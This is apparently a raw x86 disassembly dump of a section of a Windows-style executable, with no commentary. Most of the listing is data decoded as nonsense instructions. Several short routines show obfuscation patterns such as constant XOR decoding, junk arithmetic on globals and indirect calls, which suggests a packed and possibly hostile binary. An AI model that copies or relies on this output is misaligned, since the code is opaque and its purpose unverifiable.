  408282:	stos   BYTE PTR es:[edi],al
  408283:	dec    esp
  408284:	daa    
  408285:	test   eax,0x614a6526
  40828a:	push   ebp
  40828b:	mov    es,WORD PTR [ebx-0x72f2e5b7]
  408291:	pop    edx
  408292:	add    ebx,DWORD PTR [ecx+0xb58a7c7]
  408298:	pop    ds
  408299:	push   0xffffffba
  40829b:	dec    eax
  40829c:	xor    DWORD PTR [ebp-0x7f],eax
  40829f:	push   edx
  4082a0:	dec    edx
  4082a1:	outs   dx,DWORD PTR ds:[esi]
  4082a2:	ins    DWORD PTR es:[edi],dx
  4082a3:	aam    0x53
  4082a5:	dec    eax
  4082a6:	inc    ebx
  4082a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082a8:	mov    bl,0xf7
  4082aa:	xchg   ecx,esp
  4082ac:	or     al,0x2b
  4082ae:	repnz data16 xlat BYTE PTR ds:[ebx]
  4082b1:	cs xor bh,bl
  4082b4:	fiadd  WORD PTR [edi]
  4082b6:	push   0xb6ef28ad
  4082bb:	xchg   BYTE PTR [ebp-0x11],ah
  4082be:	dec    esp
  4082bf:	mov    WORD PTR es:[edx+0xad95542],?
  4082c6:	inc    esp
  4082c7:	pop    ecx
  4082c8:	ja     0x40825b
  4082ca:	nop
  4082cb:	rcr    DWORD PTR [ecx-0x7898722e],1
  4082d1:	jnp    0x408352
  4082d3:	adc    esp,esi
  4082d5:	mov    bh,BYTE PTR es:[ebx+0x422deb8e]
  4082dc:	ret    0x8a22
  4082df:	jns    0x40834d
  4082e1:	fldcw  WORD PTR [ecx]
  4082e3:	and    edx,DWORD PTR [ebp+0x273d5a52]
  4082e9:	mov    cl,0xb6
  4082eb:	fisubr DWORD PTR [ebx]
  4082ed:	rcr    ebx,cl
  4082ef:	add    BYTE PTR [esi+0x60],al
  4082f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082f3:	sar    esi,1
  4082f5:	pop    ecx
  4082f6:	std    
  4082f7:	scas   eax,DWORD PTR es:[edi]
  4082f8:	sbb    eax,esi
  4082fa:	and    al,0x75
  4082fc:	mov    esp,0x6fc52458
  408301:	jle    0x408346
  408303:	xor    eax,0x4e9ac28a
  408308:	pop    eax
  408309:	sbb    DWORD PTR [edi+0x4e8205fd],ecx
  40830f:	mov    al,ds:0x233eb8c1
  408314:	xchg   DWORD PTR [eax-0x243ffc21],ebx
  40831a:	out    dx,al
  40831b:	jne    0x408399
  40831d:	adc    edi,DWORD PTR [ecx]
  40831f:	xor    DWORD PTR es:[eax],ebp
  408322:	sub    BYTE PTR [eax-0x7e],0x82
  408326:	pop    ds
  408327:	adc    al,0x3e
  408329:	inc    edx
  40832a:	ror    bl,1
  40832c:	lea    eax,[eax+edx*1+0x32729d]
  408333:	mov    DWORD PTR [ebp+0x8],eax
  408336:	inc    DWORD PTR [ebp+0xc]
  408339:	jmp    0x407e52
  40833e:	mov    eax,DWORD PTR [ebp-0x10]
  408341:	xor    eax,ecx
  408343:	mov    ecx,DWORD PTR [ebp+0x10]
  408346:	add    eax,esi
  408348:	mov    DWORD PTR [ecx],eax
  40834a:	pop    esi
  40834b:	leave  
  40834c:	ret    0xc
  40834f:	push   ebp
  408350:	mov    ebp,esp
  408352:	push   ecx
  408353:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40835a:	neg    eax
  40835c:	mov    eax,DWORD PTR [ebp-0x4]
  40835f:	movzx  ecx,WORD PTR ds:0x42e8f2
  408366:	adc    DWORD PTR ds:0x42e8e2,ecx
  40836c:	mov    edx,DWORD PTR [ebp+0x10]
  40836f:	mov    ecx,0x7510856
  408374:	sub    DWORD PTR ds:0x4306c2,0x4d69
  40837e:	xor    eax,ecx
  408380:	add    eax,0x32729d
  408385:	adc    DWORD PTR ds:0x42e8ee,0x62f9
  40838f:	mov    DWORD PTR [edx],eax
  408391:	mov    eax,DWORD PTR [ebp+0xc]
  408394:	adc    edx,DWORD PTR ds:0x42e8ee
  40839a:	xor    eax,ecx
  40839c:	or     DWORD PTR ds:0x430626,ecx
  4083a2:	push   esi
  4083a3:	movzx  esi,BYTE PTR ds:0x43060a
  4083aa:	or     DWORD PTR ds:0x42ef8c,esi
  4083b0:	mov    esi,DWORD PTR [ebp+0x10]
  4083b3:	adc    DWORD PTR ds:0x42ef90,0x7d94
  4083bd:	mov    edx,0x32729d
  4083c2:	add    eax,edx
  4083c4:	mov    DWORD PTR [esi+0x4],eax
  4083c7:	xor    eax,eax
  4083c9:	mov    eax,DWORD PTR [ebp+0x14]
  4083cc:	mov    esi,DWORD PTR [ebp+0x10]
  4083cf:	mov    DWORD PTR [esi+0x8],eax
  4083d2:	or     DWORD PTR ds:0x43060e,ebx
  4083d8:	mov    eax,DWORD PTR [ebp+0x18]
  4083db:	dec    esi
  4083dc:	mov    esi,DWORD PTR [ebp+0x10]
  4083df:	sbb    DWORD PTR ds:0x42e8e6,0xab4
  4083e9:	mov    DWORD PTR [esi+0xc],eax
  4083ec:	mov    eax,DWORD PTR [ebp+0x1c]
  4083ef:	adc    DWORD PTR ds:0x43061a,ebx
  4083f5:	mov    esi,DWORD PTR [ebp+0x10]
  4083f8:	or     DWORD PTR ds:0x42e8f6,0x42e8ee
  408402:	mov    DWORD PTR [esi+0x10],eax
  408405:	adc    DWORD PTR ds:0x42e8ee,edi
  40840b:	mov    eax,eax
  40840d:	and    DWORD PTR ds:0x43060e,0x0
  408417:	mov    esi,DWORD PTR ds:0x43060e
  40841d:	inc    esi
  40841e:	mov    DWORD PTR ds:0x43060e,esi
  408424:	cmp    DWORD PTR ds:0x43060e,0x17
  40842b:	jne    0x40844d
  408431:	push   DWORD PTR [ebp-0x24]
  408434:	push   0x2fa6
  408439:	push   DWORD PTR [ebp-0x28]
  40843c:	push   DWORD PTR [ebp-0x10]
  40843f:	push   DWORD PTR [ebp-0x14]
  408442:	push   0x162f
  408447:	call   DWORD PTR ds:0x42eb88
  40844d:	cmp    DWORD PTR ds:0x43060e,0x15
  408454:	jb     0x408417
  40845a:	mov    eax,DWORD PTR [ebp+0x8]
  40845d:	xor    eax,ecx
  40845f:	add    eax,edx
  408461:	pop    esi
  408462:	leave  
  408463:	ret    0x18
  408466:	push   ebp
  408467:	mov    ebp,esp
  408469:	mov    eax,DWORD PTR [ebp+0xc]
  40846c:	jmp    0x40876b
  408471:	cs leave 
  408473:	or     DWORD PTR [edi+0x69204779],0xc097db4f
  40847d:	cmp    ah,BYTE PTR [edi-0x48]
  408480:	ins    BYTE PTR es:[edi],dx
  408481:	popa   
  408482:	fdivr  QWORD PTR [esi+0x7e]
  408485:	push   eax
  408486:	jo     0x408506
  408488:	jle    0x408450
  40848a:	push   esi
  40848b:	xchg   ebp,eax
  40848c:	(bad)  
  40848d:	enter  0x67b3,0xa1
  408491:	icebp  
  408492:	aas    
  408493:	push   eax
  408494:	mov    bh,BYTE PTR [eax-0x54c2f86f]
  40849a:	and    DWORD PTR [ecx-0x46],0xffffffd0
  40849e:	push   0x6c
  4084a0:	mov    ebx,0x62a15e3f
  4084a5:	jl     0x4084b8
  4084a7:	xchg   ebp,eax
  4084a8:	push   ebp
  4084a9:	ret    0xb277
  4084ac:	addr16 pushf 
  4084ae:	push   edx
  4084af:	jb     0x4084b6
  4084b1:	mov    cl,0x10
  4084b3:	xchg   esp,eax
  4084b4:	xor    eax,0x336b1d0a
  4084b9:	add    BYTE PTR [ebx-0xec55836],al
  4084bf:	test   al,0x48
  4084c1:	push   ss
  4084c2:	sub    bh,ah
  4084c4:	jp     0x4084a6
  4084c6:	sbb    BYTE PTR [eax+0x47],0xe8
  4084ca:	out    0xca,al
  4084cc:	cmc    
  4084cd:	xchg   ebp,ebx
  4084cf:	ret    
  4084d0:	lods   eax,DWORD PTR ds:[esi]
  4084d1:	push   ds
  4084d2:	outs   dx,BYTE PTR ds:[esi]
  4084d3:	fadd   DWORD PTR ds:0x9012fd61
  4084d9:	sub    al,0xf9
  4084db:	jmp    0x4084b8
  4084dd:	add    BYTE PTR [ebp+0x59],dh
  4084e0:	cmp    eax,0xbb79dcd0
  4084e5:	into   
  4084e6:	inc    esi
  4084e7:	mov    dl,0xc3
  4084e9:	pop    ds
  4084ea:	ror    ch,0x39
  4084ed:	sbb    DWORD PTR [edi+0x50],ebx
  4084f0:	mov    DWORD PTR [ebx+0x5df5621d],ecx
  4084f6:	shl    DWORD PTR [esi+eiz*2-0x5a],0x6e
  4084fb:	test   BYTE PTR [edi-0x75],0x76
  4084ff:	and    al,0x77
  408501:	push   ecx
  408502:	repz in al,0xad
  408505:	pop    esi
  408506:	fadd   st(5),st
  408508:	sub    eax,0x844865d4
  40850d:	or     esi,edx
  40850f:	jl     0x40857e
  408511:	aas    
  408512:	pop    esi
  408513:	fsubr  QWORD PTR [edi+0x4d]
  408516:	adc    eax,0xdd8a7c4c
  40851b:	test   eax,0x8ac0552c
  408520:	(bad)  
  408521:	push   es
  408522:	int3   
  408523:	inc    ebx
  408524:	push   cs
  408525:	push   cs
  408526:	idiv   DWORD PTR [edi-0x3ad7521]
  40852c:	push   eax
  40852d:	mov    ebp,DWORD PTR [ebx]
  40852f:	push   edx
  408530:	or     ch,cl
  408532:	xor    DWORD PTR [ebx],eax
  408534:	(bad)  
  408535:	xor    BYTE PTR [eax+0x5b],al
  408538:	rol    DWORD PTR [ebp+esi*1-0x40ceac4c],0x54
  408540:	cpuid  
  408542:	jg     0x408581
  408544:	pop    ecx
  408545:	repnz push ds
  408547:	test   DWORD PTR [eax-0x77776a04],ecx
  40854d:	out    0xa5,al
  40854f:	sub    ch,BYTE PTR [esi]
  408551:	jnp    0x40851b
  408553:	and    dh,BYTE PTR [ebx-0x7bb6227a]
  408559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40855a:	add    DWORD PTR [esi-0x677eecf1],ecx
  408560:	jae    0x408553
  408562:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408563:	add    BYTE PTR fs:[ecx-0x796b2cf3],bh
  40856a:	xor    al,0x19
  40856c:	pop    ebp
  40856d:	add    BYTE PTR [ecx],ch
  40856f:	fnstcw WORD PTR [edi+0x7b]
  408572:	inc    DWORD PTR [edx-0x1c607615]
  408578:	hlt    
  408579:	or     al,0xe7
  40857b:	and    BYTE PTR [ebp-0x44],0x57
  40857f:	jo     0x40854f
  408581:	scas   eax,DWORD PTR es:[edi]
  408582:	pop    ecx
  408583:	xchg   ebx,eax
  408584:	jecxz  0x4085d2
  408586:	or     dl,bl
  408588:	sbb    esi,DWORD PTR [ebx-0x50bf3c4c]
  40858e:	mov    cl,BYTE PTR [ebp-0x5f]
  408591:	sbb    al,0xcd
  408593:	rcl    DWORD PTR ds:0x9a45d186,0x75
  40859a:	jl     0x40852f
  40859c:	or     al,0xe1
  40859e:	add    DWORD PTR [edi+0x4b36afbd],esp
  4085a4:	loop   0x40854c
  4085a6:	imul   ebp,DWORD PTR [ebx+0x54],0xcd68111b
  4085ad:	sub    esp,ebp
  4085af:	push   0xe17d7929
  4085b4:	mov    BYTE PTR [edi+0x23cc509a],ah
  4085ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085bb:	xchg   esp,eax
  4085bc:	lock jle 0x40854e
  4085bf:	or     bh,BYTE PTR [edi+0x66]
  4085c2:	xlat   BYTE PTR ds:[ebx]
  4085c3:	inc    esi
  4085c4:	mov    al,0x24
  4085c6:	mov    ds:0xae28144e,eax
  4085cb:	repz mov al,0x87
  4085ce:	outs   dx,BYTE PTR cs:[esi]
  4085d0:	and    esp,edx
  4085d2:	mov    ds:0xbd866ef8,al
  4085d7:	repnz push esi
  4085d9:	ror    DWORD PTR [ebx+0x27e7d260],cl
  4085df:	cmp    eax,DWORD PTR [ecx+0x62]
  4085e2:	js     0x40864c
  4085e4:	inc    ebx
  4085e5:	push   0xfffffff4
  4085e7:	test   BYTE PTR [ebx],dh
  4085e9:	sub    al,0x6c
  4085eb:	sbb    ah,BYTE PTR [ecx+0x59b4a9a6]
  4085f1:	out    dx,eax
  4085f2:	inc    edx
  4085f3:	fdivr  DWORD PTR [edx]
  4085f5:	stc    
  4085f6:	and    ebx,DWORD PTR [edx+0x3b]
  4085f9:	bound  esi,QWORD PTR [esi-0x48]
  4085fc:	jns    0x408601
  4085fe:	or     cl,BYTE PTR [eax]
  408600:	das    
  408601:	add    DWORD PTR [eax],edx
  408603:	add    al,0xd3
  408605:	int    0xa5
  408607:	xchg   BYTE PTR [edx+0x42a73544],bl
  40860d:	jecxz  0x408619
  40860f:	jecxz  0x4085dd
  408611:	test   BYTE PTR [esi],al
  408613:	out    0xe3,eax
  408615:	int3   
  408616:	lods   eax,DWORD PTR ds:[esi]
  408617:	out    dx,al
  408618:	daa    
  408619:	aad    0xfb
  40861b:	stos   DWORD PTR es:[edi],eax
  40861c:	xor    DWORD PTR [edx],ecx
  40861e:	aad    0x4d
  408620:	inc    edi
  408621:	retf   
  408622:	add    al,0x96
  408624:	mov    eax,0x4bc8fa76
  408629:	cmp    eax,0xcddcd2ec
  40862e:	sahf   
  40862f:	and    ecx,0xbfeac7d2
  408635:	push   ss
  408636:	mov    gs,WORD PTR [eax-0x65]
  408639:	fnstenv [eax+0x21]
  40863c:	call   0xb1ed:0x304b8961
  408643:	lock and edx,ebp
  408646:	pop    ebp
  408647:	mov    esi,0xfabfbaa8
  40864c:	push   edi
  40864d:	mov    dh,0xa4
  40864f:	xor    eax,0x9f0da296
  408654:	adc    al,0xbe
  408656:	or     esi,DWORD PTR [ebx+ecx*1-0x37c7bb00]
  40865d:	mov    ebp,0x9a571e70
  408662:	(bad)  
  408663:	hlt    
  408664:	or     edi,edx
  408666:	clc    
  408667:	shl    BYTE PTR [ebx-0x38755021],0x70
  40866e:	out    0x94,eax
  408670:	in     al,dx
  408671:	test   al,0x7a
  408673:	xor    al,0xdd
  408675:	aas    
  408676:	aas    
  408677:	inc    esi
  408678:	xor    dh,BYTE PTR [ebx]
  40867a:	push   es
  40867b:	out    0x80,eax
  40867d:	je     0x4086e9
  40867f:	arpl   di,bp
  408681:	int3   
  408682:	mov    esp,0xe0bdecc1
  408687:	hlt    
  408688:	and    edi,esp
  40868a:	daa    
  40868b:	mov    ebx,0x1ed32d63
  408690:	add    eax,0xfbff1cdd
  408695:	mov    dl,0x1
  408697:	dec    BYTE PTR ds:0x9ad22e8f
  40869d:	jne    0x4086f2
  40869f:	test   esp,eax
  4086a1:	cmp    DWORD PTR [edi],ebx
  4086a3:	jmp    0x1310:0x6fb0b5d8
  4086aa:	cmp    ecx,DWORD PTR [edi-0x2801691e]
  4086b0:	in     eax,0x1c
  4086b2:	push   ebx
  4086b3:	add    dl,BYTE PTR [ebp+0x4c]
  4086b6:	dec    ecx
  4086b7:	and    DWORD PTR [eax+0x4a],0xfffffff8
  4086bb:	data16 or BYTE PTR [ebx+edi*2],dl
  4086bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086c0:	push   esi
  4086c1:	add    dh,ch
  4086c3:	loope  0x408724
  4086c5:	dec    eax
  4086c6:	popa   
  4086c7:	mov    dl,0x20
  4086c9:	lods   al,BYTE PTR ds:[esi]
  4086ca:	fidiv  DWORD PTR [eax-0x28781ef]
  4086d0:	icebp  
  4086d1:	cdq    
  4086d2:	push   ecx
  4086d3:	mov    BYTE PTR [esi-0x18],0x81
  4086d7:	hlt    
  4086d8:	rcl    DWORD PTR [eax],1
  4086da:	mov    ecx,0xa7aa93ab
  4086df:	xor    al,0xd6
  4086e1:	xor    ebp,esp
  4086e3:	or     al,0xeb
  4086e5:	fstp   QWORD PTR [ecx-0x23]
  4086e8:	push   0xc2e2609a
  4086ed:	or     eax,0xe45aeb13
  4086f2:	sar    ebp,1
  4086f4:	leave  
  4086f5:	retf   0x602a
  4086f8:	jmp    0xfa5f:0x11f0cb99
  4086ff:	cmp    al,0x69
  408701:	push   edi
  408702:	in     al,dx
  408703:	sub    bh,ch
  408705:	cmp    eax,0x4494a645
  40870a:	imul   ecx,edi,0x76
  40870d:	jp     0x40872d
  40870f:	or     ebp,ecx
  408711:	sahf   
  408712:	sub    eax,DWORD PTR [ecx*4-0x6dc535d8]
  408719:	loope  0x4086e3
  40871b:	mov    ds:0xd942da60,eax
  408720:	jp     0x40878d
  408722:	es ret 
  408724:	test   BYTE PTR [ebx],bl
  408726:	and    cl,dh
  408728:	ja     0x408785
  40872a:	shl    DWORD PTR [edx-0x30],1
  40872d:	jmp    0xaaf3:0x1bb067be
  408734:	pusha  
  408735:	mov    al,0x1e
  408737:	inc    ebp
  408738:	fstp   QWORD PTR [esi+0xaadf538]
  40873e:	popf   
  40873f:	stos   BYTE PTR es:[edi],al
  408740:	mov    eax,ds:0xfb857b45
  408745:	and    cl,dl
  408747:	jp     0x4086ed
  408749:	push   ss
  40874a:	adc    eax,0xf593e463
  40874f:	sbb    al,0x30
  408751:	sub    eax,0x2afe3557
  408756:	retf   
  408757:	sbb    al,0xd0
  408759:	(bad)  
  40875a:	retf   0x5635
  40875d:	pop    esi
  40875e:	add    al,0x30
  408760:	dec    ecx
  408761:	xor    al,0x22
  408763:	push   0x35c18299
  408768:	cmc    
  408769:	or     al,BYTE PTR [edi-0x52462dcd]
  40876f:	cld    
  408770:	fs jb  0x40876a
  408773:	icebp  
  408774:	mov    ecx,DWORD PTR [ebp+0x10]
  408777:	and    ecx,eax
  408779:	jmp    0x408a78
  40877e:	out    0xd4,eax
  408780:	xchg   BYTE PTR [ebx+0x6cfb7d9d],al
  408786:	imul   edx,ecx,0xfffffff2
  408789:	bound  ebp,QWORD PTR [edi+0x43d615db]
  40878f:	fistp  QWORD PTR [esi+0x7e]
  408792:	push   eax
  408793:	jo     0x408813
  408795:	jle    0x4087a7
  408797:	into   
  408798:	inc    esp
  408799:	jp     0x40876d
  40879b:	bound  esi,QWORD PTR [esi]
  40879d:	cmp    eax,0x67118c78
  4087a2:	test   eax,0x50891039
  4087a7:	jno    0x4087d4
  4087a9:	addr16 mov eax,ds:0x6b38
  4087ad:	jae    0x408825
  4087af:	push   0xb43fa317
  4087b4:	loope  0x408831
  4087b6:	cwde   
  4087b7:	jmp    0xbe65:0x5efdb8c4
  4087be:	arpl   WORD PTR [ecx],di
  4087c0:	jg     0x408817
  4087c2:	and    al,0x4e
  4087c4:	je     0x4087b1
  4087c6:	sar    ah,cl
  4087c8:	dec    esi
  4087c9:	adc    eax,DWORD PTR [ecx-0x43]
  4087cc:	repz (bad) 
  4087ce:	out    0x1b,eax
  4087d0:	js     0x4087a9
  4087d2:	mov    ecx,0x4c92fe1b
  4087d7:	outs   dx,DWORD PTR ds:[esi]
  4087d8:	mov    al,ds:0x1fd60b45
  4087dd:	xchg   DWORD PTR [edx+0x7effea2],edi
  4087e3:	sti    
  4087e4:	mov    esi,0x1b232a17
  4087e9:	sub    DWORD PTR [ebx],ebp
  4087eb:	jmp    0x33da440
  4087f0:	sbb    BYTE PTR [edi-0x5e],ch
  4087f3:	mov    eax,0x722d0f3c
  4087f8:	das    
  4087f9:	inc    ebp
  4087fa:	and    eax,edi
  4087fc:	shl    DWORD PTR gs:[ebx],cl
  4087ff:	inc    ebx
  408800:	pusha  
  408801:	fcmovne st,st(2)
  408803:	ret    
  408804:	and    eax,0x25e39bdc
  408809:	(bad)  [esi-0x64]
  40880c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40880d:	push   edx
  40880e:	mov    edx,DWORD PTR [ecx]
  408810:	test   al,0xfe
  408812:	cwde   
  408813:	mov    edx,DWORD PTR [edx]
  408815:	dec    esi
  408816:	mov    ds:0x8dfa96ba,eax
  40881b:	jns    0x40885f
  40881d:	add    ebp,ebx
  40881f:	push   cs
  408820:	push   ss
  408821:	mov    ds:0x3e034504,al
  408826:	pusha  
  408827:	lods   eax,DWORD PTR ds:[esi]
  408828:	lods   al,BYTE PTR ds:[esi]
  408829:	ror    DWORD PTR [edx+esi*1+0x3a],0xc4
  40882e:	mov    ch,0x7d
  408830:	or     DWORD PTR [esi],ebx
  408832:	sbb    esi,DWORD PTR [edi-0x4f]
  408835:	test   BYTE PTR [ecx],ah
  408837:	jns    0x408856
  408839:	std    
  40883a:	jp     0x4087fa
  40883c:	mov    dl,0x77
  40883e:	aaa    
  40883f:	xor    ch,BYTE PTR ds:0xb934fb0f
  408845:	div    BYTE PTR [ebx+ebp*2-0x7addbaef]
  40884c:	arpl   si,si
  40884e:	adc    ebp,DWORD PTR [eax]
  408850:	sbb    edi,ebx
  408852:	lods   al,BYTE PTR ds:[esi]
  408853:	push   ebx
  408854:	ret    
  408855:	cli    
  408856:	jne    0x408833
  408858:	ret    
  408859:	mov    ds:0xeaa4273c,al
  40885e:	loop   0x40889e
  408860:	loopne 0x408828
  408862:	and    bl,bl
  408864:	into   
  408865:	inc    ebp
  408866:	add    BYTE PTR [ebp+ecx*4+0x0],bh
  40886a:	and    eax,0xbce0fa4b
  40886f:	or     eax,0x5a0433f2
  408874:	add    DWORD PTR [ebx-0x78dbf7f5],ecx
  40887a:	cmp    al,0x60
  40887c:	or     BYTE PTR [ebx-0x2e],ah
  40887f:	sbb    ecx,DWORD PTR [esi+0x59]
  408882:	sbb    ah,bl
  408884:	xor    eax,0x1045af34
  408889:	inc    ebx
  40888a:	out    0xfe,al
  40888c:	(bad)  
  40888d:	std    
  40888e:	jno    0x408816
  408890:	push   edi
  408891:	sub    eax,0xce1b413b
  408896:	adc    eax,0xaeb0494f
  40889b:	sahf   
  40889c:	and    al,0x8d
  40889e:	xor    dl,BYTE PTR [esi+0x74]
  4088a1:	mov    ecx,0xaa2e3b6
  4088a6:	jne    0x40890a
  4088a8:	fimul  DWORD PTR [esi+0x32]
  4088ab:	push   ds
  4088ac:	mov    esp,0x49f2610d
  4088b1:	mov    edx,0xb0c4fc88
  4088b7:	push   0x6bbe41c0
  4088bc:	cwde   
  4088bd:	mov    ebp,0x24b2870f
  4088c2:	mov    al,0x8f
  4088c4:	xor    esp,eax
  4088c6:	mov    edx,0x8bca24d5
  4088cb:	and    ebx,esi
  4088cd:	std    
  4088ce:	adc    eax,0xdd8e4637
  4088d3:	cdq    
  4088d4:	xor    esi,DWORD PTR [edi+0x3d]
  4088d7:	outs   dx,DWORD PTR ds:[esi]
  4088d8:	out    dx,eax
  4088d9:	cwde   
  4088da:	add    ecx,edi
  4088dc:	push   ecx
  4088dd:	mov    ebp,0x5bb9febd
  4088e2:	mov    bl,bh
  4088e4:	sbb    al,0x72
  4088e6:	add    BYTE PTR [edi],ch
  4088e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088e9:	xlat   BYTE PTR ds:[ebx]
  4088ea:	test   al,0xf7
  4088ec:	jl     0x408887
  4088ee:	arpl   WORD PTR [esi],dx
  4088f0:	into   
  4088f1:	ror    DWORD PTR [edx],cl
  4088f3:	mov    al,dl
  4088f5:	icebp  
  4088f6:	xchg   bx,ax
  4088f8:	jp     0x408949
  4088fa:	dec    esi
  4088fb:	daa    
  4088fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088fd:	sbb    ch,ch
  4088ff:	sti    
  408900:	xor    ebx,DWORD PTR ds:0x80dc6c9f
  408906:	ret    0xb7a7
  408909:	rcr    DWORD PTR [eax-0x57],0xa
  40890d:	in     al,0xf7
  40890f:	jbe    0x40892d
  408911:	jmp    FWORD PTR [ebx-0x5ea73086]
  408917:	cmp    BYTE PTR [edx-0x53],ch
  40891a:	not    BYTE PTR [edx+0x2be0de5b]
  408920:	scas   al,BYTE PTR es:[edi]
  408921:	aas    
  408922:	cdq    
  408923:	and    ebp,esi
  408925:	out    dx,al
  408926:	stos   BYTE PTR es:[edi],al
  408927:	enter  0xb6f1,0xf6
  40892b:	jl     0x4088dd
  40892d:	pop    edx
  40892e:	out    dx,al
  40892f:	add    esp,ecx
  408931:	mov    edi,DWORD PTR [ebx-0x28]
  408934:	push   eax
  408935:	inc    esi
  408936:	inc    DWORD PTR [esi-0x10]
  408939:	xchg   esp,eax
  40893a:	ret    0x17e3
  40893d:	(bad)  [ebp-0x1e22f7de]
  408943:	pop    es
  408944:	js     0x40892d
  408946:	xor    DWORD PTR [esi+0x165cd7bf],edi
  40894c:	add    eax,0xf938bece
  408951:	push   eax
  408952:	cmp    eax,0x2f14cd0a
  408957:	push   ebx
  408958:	inc    esi
  408959:	cmp    ch,bl
  40895b:	mov    esi,0xfc29c741
  408960:	jmp    0x4089d2
  408962:	lahf   
  408963:	and    edi,DWORD PTR [edi-0x29]
  408966:	std    
  408967:	add    eax,0xbcc6a247
  40896c:	mov    bh,0x58
  40896e:	xchg   esi,eax
  40896f:	(bad)  
  408970:	dec    esp
  408971:	sbb    BYTE PTR [eax+0x2670244e],0x1a
  408978:	pop    edi
  408979:	mov    ecx,0xd6ab0271
  40897e:	jmp    0x643:0xa587e347
  408985:	retf   0xc3ef
  408988:	add    DWORD PTR [edi],eax
  40898a:	dec    ebp
  40898b:	inc    ecx
  40898c:	mov    bl,0x6c
  40898e:	jg     0x40896e
  408990:	xor    ebp,DWORD PTR [esi]
  408992:	ins    DWORD PTR es:[edi],dx
  408993:	mov    ebp,0x907d7fa6
  408998:	xlat   BYTE PTR ds:[ebx]
  408999:	sub    ebx,DWORD PTR fs:[eax+ecx*2+0x3]
  40899e:	hlt    
  40899f:	fwait
  4089a0:	test   al,0xf5
  4089a2:	pop    ds
  4089a3:	je     0x40898d
  4089a5:	dec    edi
  4089a6:	cwde   
  4089a7:	stos   BYTE PTR es:[edi],al
  4089a8:	std    
  4089a9:	xor    dh,dh
  4089ab:	mov    ds:0x29234a45,eax
  4089b0:	pop    ebp
  4089b1:	gs adc ebp,ebx
  4089b4:	adc    al,0xb9
  4089b6:	(bad)
  4089ba:	sub    BYTE PTR [ecx],0x9c
  4089bd:	jbe    0x40895e
  4089bf:	xchg   edx,eax
  4089c0:	mov    ds:0xe417d63b,al
  4089c5:	mov    edx,0xead73a0a
  4089ca:	cdq    
  4089cb:	cli    
  4089cc:	lahf   
  4089cd:	xchg   ebp,eax
  4089ce:	ds pop ebx
  4089d0:	sub    esi,DWORD PTR [ebx-0x854a47e]
  4089d6:	jno    0x408a2b
  4089d8:	mov    dl,0x34
  4089da:	js     0x408a40
  4089dc:	pop    esi
  4089dd:	std    
  4089de:	ins    BYTE PTR es:[edi],dx
  4089df:	mov    ebp,0xcfc6c5c5
  4089e4:	popf   
  4089e5:	jmp    0x9674:0xba1a11f7
  4089ec:	in     eax,dx
  4089ed:	cmp    al,0xa7
  4089ef:	jbe    0x408a58
  4089f1:	fnsave [esi-0x42]
  4089f4:	rcr    DWORD PTR ds:[esi+0x12],1
  4089f8:	shl    ebp,0x7d
  4089fb:	xor    BYTE PTR ds:0xc11a35da,ah
  408a01:	mov    bh,0x7
  408a03:	fild   QWORD PTR [ebx-0x296672db]
  408a09:	dec    esp
  408a0a:	cmc    
  408a0b:	and    ebp,DWORD PTR [ebp+eax*4-0x67410705]
  408a12:	xchg   esp,eax
  408a13:	lock cmp dh,ch
  408a16:	push   0xae6301c9
  408a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a1c:	mov    DWORD PTR [ebx+0x3b],ebp
  408a1f:	inc    esp
  408a20:	(bad)  
  408a22:	fild   QWORD PTR [ebx*4+0x45501480]
  408a29:	pop    ss
  408a2a:	xchg   edi,eax
  408a2b:	fwait
  408a2c:	ds mov dh,0xc3
  408a2f:	mov    esp,0x83b02cf3
  408a34:	lahf   
  408a35:	push   ecx
  408a36:	dec    edi
  408a37:	popf   
  408a38:	xor    ebx,DWORD PTR [edx-0x2d106e54]
  408a3e:	inc    edi
  408a3f:	test   ebx,edx
  408a41:	sbb    BYTE PTR [edi+0x40],0xe0
  408a45:	dec    ebx
  408a46:	mov    ecx,0xd4c48fd2
  408a4b:	sub    edx,edx
  408a4d:	dec    eax
  408a4e:	mov    ebx,0xe7588d7a
  408a53:	push   ecx
  408a54:	shr    bh,cl
  408a56:	inc    esp
  408a57:	ins    BYTE PTR es:[edi],dx
  408a58:	lock xor al,0x8b
  408a5b:	pop    ds
  408a5c:	push   ds
  408a5d:	pop    edx
  408a5e:	cmp    eax,0x52bf652d
  408a63:	ficomp WORD PTR [esi]
  408a65:	dec    esp
  408a66:	and    DWORD PTR [esi],0xa921a3df
  408a6c:	or     eax,DWORD PTR [esi+0x1278f4e1]
  408a72:	mov    WORD PTR [ebx],es
  408a74:	mov    ah,0xa7
  408a76:	(bad)  
  408a77:	mov    esp,0x1d8fc981
  408a7c:	push   ss
  408a7d:	or     DWORD PTR [ebx+0x18c25dc1],0xec8b5500
  408a87:	push   ecx
  408a88:	mov    DWORD PTR ds:0x42e8ea,0x1d
  408a92:	cmp    DWORD PTR ds:0x42e8ea,0x0
  408a99:	je     0x408add
  408a9f:	cmp    DWORD PTR ds:0x42e8ea,0x1f
  408aa6:	jne    0x408ac1
  408aac:	push   0x430616
  408ab1:	push   0x42efb0
  408ab6:	push   0x69fb
  408abb:	call   DWORD PTR ds:0x42ec2c
  408ac1:	mov    ecx,DWORD PTR ds:0x42e8ea
  408ac7:	dec    ecx
  408ac8:	mov    DWORD PTR ds:0x42e8ea,ecx
  408ace:	jmp    0x408a92
  408ad3:	adc    DWORD PTR ds:0x42e8e6,0x3f8f
  408add:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  408ae4:	mov    eax,DWORD PTR [ebp-0x4]
  408ae7:	sbb    edx,0xd84
  408aed:	mov    edx,DWORD PTR [ebp+0x10]
  408af0:	xor    DWORD PTR ds:0x430642,0x464
  408afa:	mov    ecx,0x7510856
  408aff:	xor    eax,ecx
  408b01:	jmp    0x408cf5
  408b06:	jno    0x408b66
  408b08:	test   bl,ah
  408b0a:	gs in  eax,0x51
